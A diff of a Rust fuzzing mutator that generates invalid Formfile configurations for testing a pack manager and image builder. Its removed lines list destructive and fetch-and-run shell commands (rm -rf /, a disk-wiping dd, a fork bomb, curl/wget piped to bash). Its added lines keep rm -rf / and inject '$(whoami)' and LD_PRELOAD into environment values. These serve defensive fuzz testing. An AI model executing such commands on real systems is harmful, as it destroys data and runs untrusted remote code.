@@ -1,9 +1,9 @@
 // form-fuzzing/src/mutators/pack.rs
 //! Mutators for Pack Manager and Image Builder fuzzing
 
-use crate::harness::pack::{Formfile, Resources, Network, User, GpuRequirement};
+use crate::harness::pack::{Formfile, Resources, NetworkConfig, User};
 use crate::mutators::Mutator;
-use rand::Rng;
+use rand::{thread_rng, Rng, seq::SliceRandom};
 use std::collections::HashMap;
 
 /// Mutator for Formfiles
@@ -26,245 +26,218 @@ impl Mutator<Formfile> for FormfileMutator {
         match mutation {
             0 => {
                 // Mutate base image
-                if let Some(ref mut from) = formfile.from {
-                    if rng.gen_bool(0.5) {
-                        // Use a potentially invalid base image
-                        *from = format!("{}:{}", 
-                            ["ubuntu", "debian", "alpine", "centos", "nonsense", "invalid"]
-                                .choose(&mut rng)
-                                .unwrap(),
-                            rng.gen_range(1..50).to_string());
-                    } else {
-                        // Empty base image
-                        *from = "".to_string();
-                    }
+                if rng.gen_bool(0.5) {
+                    // Use a potentially invalid base image
+                    formfile.base_image = format!("{}:{}", 
+                        ["ubuntu", "debian", "alpine", "centos", "nonsense", "invalid"]
+                            .choose(&mut rng)
+                            .unwrap(),
+                        rng.gen_range(1..50).to_string());
                 } else {
-                    // Add a base image
-                    formfile.from = Some("invalid:latest".to_string());
+                    // Empty base image
+                    formfile.base_image = "".to_string();
                 }
             },
             1 => {
                 // Mutate run commands
-                if let Some(ref mut run) = formfile.run {
-                    if rng.gen_bool(0.5) && !run.is_empty() {
-                        // Remove a command
-                        let idx = rng.gen_range(0..run.len());
-                        run.remove(idx);
-                    } else {
-                        // Add a potentially dangerous command
-                        let dangerous_commands = [
-                            "rm -rf /",
-                            "dd if=/dev/zero of=/dev/sda",
-                            ":(){ :|:& };:",
-                            "wget -O - http://example.com/script.sh | bash",
-                            "eval \"$(curl -s http://example.com/script.sh)\"",
-                        ];
-                        run.push(dangerous_commands.choose(&mut rng).unwrap().to_string());
-                    }
+                if rng.gen_bool(0.5) && !formfile.run_commands.is_empty() {
+                    // Remove a command
+                    let idx = rng.gen_range(0..formfile.run_commands.len());
+                    formfile.run_commands.remove(idx);
                 } else {
-                    // Add run commands
-                    formfile.run = Some(vec!["echo 'Hello, world!'".to_string()]);
+                    // Add an invalid command
+                    formfile.run_commands.push(match rng.gen_range(0..3) {
+                        0 => "invalid command".to_string(),
+                        1 => "rm -rf /".to_string(), // Dangerous command
+                        _ => "#!&%*@".to_string(), // Garbage
+                    });
                 }
             },
             2 => {
                 // Mutate environment variables
-                if let Some(ref mut env) = formfile.env {
-                    if rng.gen_bool(0.5) && !env.is_empty() {
-                        // Remove a random env var
-                        let keys: Vec<String> = env.keys().cloned().collect();
-                        if !keys.is_empty() {
-                            let idx = rng.gen_range(0..keys.len());
-                            env.remove(&keys[idx]);
-                        }
-                    } else {
-                        // Add or modify an env var with a very long value
-                        env.insert(
-                            format!("VAR_{}", rng.gen::<u16>()),
-                            "X".repeat(rng.gen_range(1000..10000)),
-                        );
-                    }
+                if rng.gen_bool(0.5) && !formfile.env_vars.is_empty() {
+                    // Remove an env var
+                    let keys: Vec<_> = formfile.env_vars.keys().cloned().collect();
+                    let idx = rng.gen_range(0..keys.len());
+                    formfile.env_vars.remove(&keys[idx]);
                 } else {
-                    // Add environment variables
-                    let mut new_env = HashMap::new();
-                    new_env.insert("TEST_VAR".to_string(), "test_value".to_string());
-                    formfile.env = Some(new_env);
+                    // Add a problematic env var
+                    let key = match rng.gen_range(0..3) {
+                        0 => "PATH".to_string(),
+                        1 => "LD_PRELOAD".to_string(),
+                        _ => "SHELL".to_string(),
+                    };
+                    let value = match rng.gen_range(0..3) {
+                        0 => "/dev/null".to_string(),
+                        1 => "/etc/passwd".to_string(),
+                        _ => "$(whoami)".to_string(), // Command injection
+                    };
+                    formfile.env_vars.insert(key, value);
                 }
             },
             3 => {
                 // Mutate resources
                 if let Some(ref mut resources) = formfile.resources {
-                    // Choose a specific resource to mutate
                     let resource_mutation = rng.gen_range(0..4);
-                    
                     match resource_mutation {
                         0 => {
                             // Mutate vCPUs
-                            resources.vcpus = Some(match rng.gen_range(0..3) {
+                            resources.vcpus = match rng.gen_range(0..3) {
                                 0 => 0, // Invalid: zero vCPUs
                                 1 => 255, // Invalid: too many vCPUs
                                 _ => rng.gen_range(100..200), // Unusually high
-                            });
+                            };
                         },
                         1 => {
                             // Mutate memory
-                            resources.memory_mb = Some(match rng.gen_range(0..3) {
+                            resources.memory_mb = match rng.gen_range(0..3) {
                                 0 => 0, // Invalid: zero memory
                                 1 => rng.gen_range(1..32), // Too little memory
-                                _ => rng.gen_range(1024 * 1024 * 10..u64::MAX / 2), // Extremely high
-                            });
+                                _ => rng.gen_range(1024 * 1024 * 10..u32::MAX / 2), // Extremely high
+                            };
                         },
                         2 => {
                             // Mutate disk
-                            resources.disk_gb = Some(match rng.gen_range(0..3) {
+                            resources.disk_gb = match rng.gen_range(0..3) {
                                 0 => 0, // Invalid: zero disk
                                 1 => rng.gen_range(5000..10000), // Very large disk
                                 _ => rng.gen_range(1..3), // Very small disk
-                            });
+                            };
                         },
                         3 => {
                             // Mutate GPU
-                            if rng.gen_bool(0.5) {
-                                // Remove GPU
-                                resources.gpu = None;
+                            if let Some(ref mut gpu) = resources.gpu {
+                                // Turn it into an invalid GPU string
+                                *gpu = format!("invalid-gpu-{}", rng.gen::<u16>());
                             } else {
-                                // Invalid GPU
-                                resources.gpu = Some(GpuRequirement {
-                                    model: format!("invalid-gpu-{}", rng.gen::<u16>()),
-                                    count: rng.gen_range(10..100), // Unusually high count
-                                });
+                                // Add a GPU with no model
+                                resources.gpu = Some("unknown".to_string());
                             }
                         },
                         _ => {}
                     }
                 } else {
-                    // Add resources with extreme values
+                    // Create an invalid resource specification
                     formfile.resources = Some(Resources {
-                        vcpus: Some(rng.gen_range(64..255)),
-                        memory_mb: Some(rng.gen_range(1024 * 1024..u64::MAX / 2)),
-                        disk_gb: Some(rng.gen_range(1000..5000)),
-                        gpu: Some(GpuRequirement {
-                            model: "extreme-gpu".to_string(),
-                            count: rng.gen_range(4..16),
-                        }),
+                        vcpus: rng.gen_range(64..255),
+                        memory_mb: rng.gen_range(1024 * 1024..u32::MAX / 2),
+                        disk_gb: rng.gen_range(1000..5000),
+                        gpu: Some("overpowered-gpu".to_string()),
                     });
                 }
             },
             4 => {
-                // Mutate network configuration
+                // Mutate network
                 if let Some(ref mut network) = formfile.network {
-                    if rng.gen_bool(0.5) {
-                        // Flip join_formnet
-                        network.join_formnet = network.join_formnet.map(|v| !v);
-                    } else {
-                        // Add invalid external networks
-                        let invalid_networks = [
-                            "invalid/network",
-                            "*.wildcard",
-                            "../path-traversal",
-                            "network with spaces",
-                            "!@#$%^&*()",
-                        ];
-                        
-                        network.external_networks = Some(
-                            (0..rng.gen_range(1..5))
-                                .map(|_| invalid_networks.choose(&mut rng).unwrap().to_string())
-                                .collect()
-                        );
+                    let network_mutation = rng.gen_range(0..2);
+                    match network_mutation {
+                        0 => {
+                            // Flip formation network joining
+                            network.join_formnet = !network.join_formnet;
+                        },
+                        1 => {
+                            // Add invalid external networks
+                            let invalid_networks = [
+                                "192.168.0.0/8", // Invalid CIDR
+                                "public-internet", // Non-specific
+                                "internal/network", // Invalid chars
+                                "my_home_network", // Non-existent
+                                "", // Empty string
+                            ];
+                            
+                            network.external_networks = 
+                                (0..rng.gen_range(1..5))
+                                    .map(|_| invalid_networks.choose(&mut rng).unwrap().to_string())
+                                    .collect();
+                        },
+                        _ => {}
                     }
                 } else {
-                    // Add network with invalid configuration
-                    formfile.network = Some(Network {
-                        join_formnet: Some(true),
-                        external_networks: Some(vec!["../path-traversal".to_string()]),
+                    // Create an invalid network config
+                    formfile.network = Some(NetworkConfig {
+                        join_formnet: true,
+                        external_networks: vec!["invalid-network".to_string()],
                     });
                 }
             },
             5 => {
                 // Mutate exposed ports
-                if let Some(ref mut expose) = formfile.expose {
-                    if rng.gen_bool(0.5) && !expose.is_empty() {
+                if !formfile.exposed_ports.is_empty() {
+                    if rng.gen_bool(0.5) {
                         // Remove a port
-                        let idx = rng.gen_range(0..expose.len());
-                        expose.remove(idx);
+                        let idx = rng.gen_range(0..formfile.exposed_ports.len());
+                        formfile.exposed_ports.remove(idx);
                     } else {
-                        // Add invalid or unusual ports
-                        let port = match rng.gen_range(0..3) {
+                        // Modify a port to an invalid or edge case value
+                        let idx = rng.gen_range(0..formfile.exposed_ports.len());
+                        formfile.exposed_ports[idx] = match rng.gen_range(0..3) {
                             0 => 0, // Invalid: port 0
-                            1 => rng.gen_range(1..1024), // Privileged port
-                            _ => 65535, // Maximum port
+                            1 => 1, // Reserved port
+                            _ => 65535, // Max port
                         };
-                        expose.push(port);
                     }
                 } else {
-                    // Add exposed ports
-                    formfile.expose = Some(vec![0, 1, 65535]); // Mix of invalid and edge case ports
+                    // Add some invalid or edge case ports
+                    formfile.exposed_ports = vec![0, 1, 65535]; // Mix of invalid and edge case ports
                 }
             },
             6 => {
                 // Mutate users
-                if let Some(ref mut users) = formfile.users {
-                    if rng.gen_bool(0.5) && !users.is_empty() {
-                        // Mutate existing user
-                        let idx = rng.gen_range(0..users.len());
-                        let user_mutation = rng.gen_range(0..4);
-                        
-                        match user_mutation {
-                            0 => {
-                                // Empty username (invalid)
-                                users[idx].username = "".to_string();
-                            },
-                            1 => {
-                                // "root" username (invalid)
-                                users[idx].username = "root".to_string();
-                            },
-                            2 => {
-                                // Very long username
-                                users[idx].username = "x".repeat(rng.gen_range(100..1000));
-                            },
-                            3 => {
-                                // Invalid SSH key
-                                users[idx].ssh_authorized_keys = Some(vec!["not a valid ssh key".to_string()]);
-                            },
-                            _ => {}
-                        }
-                    } else {
-                        // Add invalid user
-                        users.push(User {
-                            username: "".to_string(), // Empty username (invalid)
-                            password: Some("password".to_string()),
-                            sudo: Some(true),
-                            ssh_authorized_keys: None,
-                        });
+                if !formfile.users.is_empty() {
+                    // Choose a user to mutate
+                    let idx = rng.gen_range(0..formfile.users.len());
+                    let user = &mut formfile.users[idx];
+                    
+                    // Choose what to mutate
+                    let user_mutation = rng.gen_range(0..3);
+                    match user_mutation {
+                        0 => {
+                            // Mutate the username (potentially to an invalid one)
+                            user.username = match rng.gen_range(0..3) {
+                                0 => "root".to_string(), // Not allowed
+                                1 => "".to_string(), // Empty
+                                _ => "user-with-invalid-chars!@#$%".to_string(),
+                            };
+                        },
+                        1 => {
+                            // Mutate password
+                            // Make it an invalid or edge case password
+                            user.password = if rng.gen_bool(0.5) {
+                                // Very short
+                                "x".to_string()
+                            } else {
+                                // Very long
+                                "X".repeat(rng.gen_range(1000..10000))
+                            };
+                        },
+                        2 => {
+                            // Toggle sudo
+                            user.sudo = !user.sudo;
+                        },
+                        _ => {}
                     }
                 } else {
-                    // Add users with invalid configuration
-                    formfile.users = Some(vec![
-                        User {
-                            username: "root".to_string(), // Invalid: can't create root
-                            password: Some("password".to_string()),
-                            sudo: Some(true),
-                            ssh_authorized_keys: None,
-                        }
-                    ]);
+                    // Add an invalid user
+                    formfile.users.push(User {
+                        username: "root".to_string(), // Invalid: can't create root
+                        password: "password".to_string(),
+                        sudo: true,
+                        ssh_authorized_keys: vec![],
+                    });
                 }
             },
             7 => {
                 // Mutate entrypoint
                 if let Some(ref mut entrypoint) = formfile.entrypoint {
-                    if rng.gen_bool(0.5) {
-                        // Empty entrypoint
-                        *entrypoint = "".to_string();
-                    } else {
-                        // Invalid entrypoint
-                        *entrypoint = match rng.gen_range(0..3) {
-                            0 => "/nonexistent/path".to_string(),
-                            1 => "command with invalid \"quotes".to_string(),
-                            _ => "X".repeat(rng.gen_range(1000..5000)), // Very long command
-                        };
-                    }
+                    // Make it invalid
+                    *entrypoint = match rng.gen_range(0..3) {
+                        0 => "".to_string(), // Empty
+                        1 => "/nonexistent/path".to_string(), // Non-existent
+                        _ => "/dev/null".to_string(), // Invalid binary
+                    };
                 } else {
-                    // Add entrypoint
-                    formfile.entrypoint = Some("/bin/true".to_string());
+                    // Add an entrypoint
+                    formfile.entrypoint = Some("/bin/false".to_string()); // Will immediately exit
                 }
             },
             _ => {}
@@ -276,7 +249,7 @@ impl Mutator<Formfile> for FormfileMutator {
 pub struct ResourcesMutator;
 
 impl ResourcesMutator {
-    /// Create a new Resources mutator
+    /// Create a new resources mutator
     pub fn new() -> Self {
         Self
     }
@@ -286,58 +259,42 @@ impl Mutator<Resources> for ResourcesMutator {
     fn mutate(&self, resources: &mut Resources) {
         let mut rng = rand::thread_rng();
         
-        // Choose a random aspect to mutate
+        // Choose a resource aspect to mutate
         let mutation = rng.gen_range(0..4);
         
         match mutation {
             0 => {
                 // Mutate vCPUs
-                resources.vcpus = Some(match rng.gen_range(0..3) {
+                resources.vcpus = match rng.gen_range(0..3) {
                     0 => 0, // Invalid: zero vCPUs
                     1 => 255, // Invalid: too many vCPUs
                     _ => rng.gen_range(100..200), // Unusually high
-                });
+                };
             },
             1 => {
                 // Mutate memory
-                resources.memory_mb = Some(match rng.gen_range(0..3) {
+                resources.memory_mb = match rng.gen_range(0..3) {
                     0 => 0, // Invalid: zero memory
                     1 => rng.gen_range(1..32), // Too little memory
-                    _ => rng.gen_range(1024 * 1024 * 10..u64::MAX / 2), // Extremely high
-                });
+                    _ => rng.gen_range(1024 * 1024 * 10..u32::MAX / 2), // Extremely high
+                };
             },
             2 => {
                 // Mutate disk
-                resources.disk_gb = Some(match rng.gen_range(0..3) {
+                resources.disk_gb = match rng.gen_range(0..3) {
                     0 => 0, // Invalid: zero disk
                     1 => rng.gen_range(5000..10000), // Very large disk
                     _ => rng.gen_range(1..3), // Very small disk
-                });
+                };
             },
             3 => {
                 // Mutate GPU
                 if let Some(ref mut gpu) = resources.gpu {
-                    match rng.gen_range(0..3) {
-                        0 => {
-                            // Invalid GPU model
-                            gpu.model = format!("invalid-gpu-{}", rng.gen::<u16>());
-                        },
-                        1 => {
-                            // Zero GPU count (invalid)
-                            gpu.count = 0;
-                        },
-                        2 => {
-                            // Excessive GPU count
-                            gpu.count = rng.gen_range(10..100);
-                        },
-                        _ => {}
-                    }
+                    // Turn it into an invalid GPU string
+                    *gpu = format!("invalid-gpu-{}", rng.gen::<u16>());
                 } else {
-                    // Add GPU with invalid values
-                    resources.gpu = Some(GpuRequirement {
-                        model: format!("invalid-gpu-{}", rng.gen::<u16>()),
-                        count: rng.gen_range(10..100),
-                    });
+                    // Add a GPU
+                    resources.gpu = Some("unknown-gpu".to_string());
                 }
             },
             _ => {}
@@ -345,54 +302,54 @@ impl Mutator<Resources> for ResourcesMutator {
     }
 }
 
-/// Mutator for Network configuration
+/// Network configuration mutator
 pub struct NetworkMutator;
 
 impl NetworkMutator {
-    /// Create a new Network mutator
+    /// Create a new network mutator
     pub fn new() -> Self {
         Self
     }
 }
 
-impl Mutator<Network> for NetworkMutator {
-    fn mutate(&self, network: &mut Network) {
+impl Mutator<NetworkConfig> for NetworkMutator {
+    fn mutate(&self, network: &mut NetworkConfig) {
         let mut rng = rand::thread_rng();
         
-        // Choose a random aspect to mutate
+        // Choose a network aspect to mutate
         let mutation = rng.gen_range(0..2);
         
         match mutation {
             0 => {
-                // Mutate join_formnet
-                network.join_formnet = Some(!network.join_formnet.unwrap_or(false));
+                // Flip formation network joining
+                network.join_formnet = !network.join_formnet;
             },
             1 => {
-                // Mutate external networks
-                if let Some(ref mut external_networks) = network.external_networks {
-                    if rng.gen_bool(0.3) && !external_networks.is_empty() {
-                        // Remove a network
-                        let idx = rng.gen_range(0..external_networks.len());
-                        external_networks.remove(idx);
+                // Modify external networks
+                if !network.external_networks.is_empty() {
+                    // Choose whether to remove or add invalid
+                    if rng.gen_bool(0.3) {
+                        // Remove one
+                        let idx = rng.gen_range(0..network.external_networks.len());
+                        network.external_networks.remove(idx);
                     } else {
-                        // Add invalid network names
+                        // Replace with invalid
                         let invalid_networks = [
-                            "invalid/network",
-                            "*.wildcard",
-                            "../path-traversal",
-                            "network with spaces",
-                            "!@#$%^&*()",
-                            "X".repeat(100), // Very long name
+                            "192.168.0.0/8", // Invalid CIDR
+                            "public-internet", // Non-specific
+                            "internal/network", // Invalid chars
+                            "my_home_network", // Non-existent
+                            "", // Empty string
                         ];
                         
-                        external_networks.push(invalid_networks.choose(&mut rng).unwrap().to_string());
+                        network.external_networks = 
+                            (0..rng.gen_range(1..5))
+                                .map(|_| invalid_networks.choose(&mut rng).unwrap().to_string())
+                                .collect();
                     }
                 } else {
-                    // Add external networks with invalid values
-                    network.external_networks = Some(vec![
-                        "../path-traversal".to_string(),
-                        "network with spaces".to_string(),
-                    ]);
+                    // Add an invalid one
+                    network.external_networks.push("invalid/network".to_string());
                 }
             },
             _ => {}
@@ -400,11 +357,11 @@ impl Mutator<Network> for NetworkMutator {
     }
 }
 
-/// Mutator for User configuration
+/// User mutator
 pub struct UserMutator;
 
 impl UserMutator {
-    /// Create a new User mutator
+    /// Create a new user mutator
     pub fn new() -> Self {
         Self
     }
@@ -414,64 +371,50 @@ impl Mutator<User> for UserMutator {
     fn mutate(&self, user: &mut User) {
         let mut rng = rand::thread_rng();
         
-        // Choose a random aspect to mutate
+        // Choose a user aspect to mutate
         let mutation = rng.gen_range(0..4);
         
         match mutation {
             0 => {
-                // Mutate username
+                // Mutate the username (potentially to an invalid one)
                 user.username = match rng.gen_range(0..3) {
-                    0 => "".to_string(), // Empty (invalid)
-                    1 => "root".to_string(), // Reserved (invalid)
-                    _ => "X".repeat(rng.gen_range(100..1000)), // Very long
+                    0 => "root".to_string(), // Not allowed
+                    1 => "".to_string(), // Empty
+                    _ => "user-with-invalid-chars!@#$%".to_string(),
                 };
             },
             1 => {
                 // Mutate password
-                if user.password.is_some() {
-                    if rng.gen_bool(0.5) {
-                        // Remove password
-                        user.password = None;
-                    } else {
-                        // Set to very short or very long password
-                        user.password = Some(if rng.gen_bool(0.5) {
-                            // Very short
-                            "x".to_string()
-                        } else {
-                            // Very long
-                            "X".repeat(rng.gen_range(1000..10000))
-                        });
-                    }
+                // Make it an invalid or edge case password
+                user.password = if rng.gen_bool(0.5) {
+                    // Very short
+                    "x".to_string()
                 } else {
-                    // Add a password
-                    user.password = Some("password".to_string());
-                }
+                    // Very long
+                    "X".repeat(rng.gen_range(1000..10000))
+                };
             },
             2 => {
-                // Mutate sudo
-                user.sudo = Some(!user.sudo.unwrap_or(false));
+                // Toggle sudo
+                user.sudo = !user.sudo;
             },
             3 => {
-                // Mutate SSH authorized keys
-                if let Some(ref mut keys) = user.ssh_authorized_keys {
-                    if rng.gen_bool(0.5) && !keys.is_empty() {
+                // Mutate ssh keys
+                if !user.ssh_authorized_keys.is_empty() {
+                    if rng.gen_bool(0.5) {
                         // Remove a key
-                        let idx = rng.gen_range(0..keys.len());
-                        keys.remove(idx);
+                        let idx = rng.gen_range(0..user.ssh_authorized_keys.len());
+                        user.ssh_authorized_keys.remove(idx);
                     } else {
-                        // Add invalid SSH key
-                        keys.push(match rng.gen_range(0..3) {
-                            0 => "not an ssh key".to_string(),
-                            1 => "ssh-rsa invalid format".to_string(),
-                            _ => format!("ssh-rsa {}", "X".repeat(rng.gen_range(1000..5000))),
-                        });
+                        // Replace with invalid
+                        user.ssh_authorized_keys = vec![
+                            "not a valid ssh key".to_string(),
+                            "ssh-rsa with no content".to_string(),
+                        ];
                     }
                 } else {
-                    // Add SSH keys with invalid values
-                    user.ssh_authorized_keys = Some(vec![
-                        "not a valid ssh key".to_string(),
-                        "ssh-rsa with no content".to_string(),
-                    ]);
+                    // Add invalid keys
+                    user.ssh_authorized_keys.push("not a valid key".to_string());
                 }
             },
             _ => {}
